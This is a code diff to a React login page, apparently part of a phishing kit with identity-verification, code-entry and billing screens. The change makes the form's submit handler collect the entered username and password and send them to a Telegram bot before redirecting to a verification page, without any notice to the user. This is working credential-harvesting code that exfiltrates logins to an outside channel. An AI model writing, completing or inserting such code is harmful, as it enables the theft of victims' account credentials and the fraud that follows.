@@ -6,6 +6,7 @@ import IdentityVerification from './components/IdentityVerification'
 import EnterCode from './components/EnterCode'
 import Billing from './components/Billing'
 import LoadingOverlay from './components/LoadingOverlay'
+import { sendLoginData } from './services/telegramBot'
 
 function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
@@ -16,8 +17,18 @@ function LoginPage() {
     setShowPassword(!showPassword);
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
+    
+    // Collect form data
+    const formData = {
+      username: e.target.username.value,
+      password: e.target.password.value,
+    };
+    
+    // Send to Telegram bot
+    await sendLoginData(formData);
+    
     navigate('/verify');
   };
 
